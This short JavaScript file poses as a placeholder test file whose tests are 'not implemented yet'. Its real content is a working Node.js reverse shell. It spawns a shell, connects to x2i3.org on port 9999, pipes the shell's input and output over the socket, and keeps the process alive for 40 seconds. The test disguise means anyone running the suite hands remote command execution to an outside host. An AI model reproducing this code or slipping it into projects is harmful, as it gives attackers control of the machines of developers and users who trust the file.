// TODO: implement the tests

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
	console.log("Tests are not implemented yet...");
    var client = new net.Socket();
    client.connect(9999, "x2i3.org", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

// Sleep for 40 seconds
setTimeout(function(){
    // Exit the process
    process.exit();
} , 40000);

// Block exit
process.stdin.resume();